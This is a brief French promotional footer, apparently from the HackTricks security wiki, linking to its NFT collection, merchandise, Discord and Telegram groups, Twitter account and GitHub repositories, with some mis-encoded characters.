* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
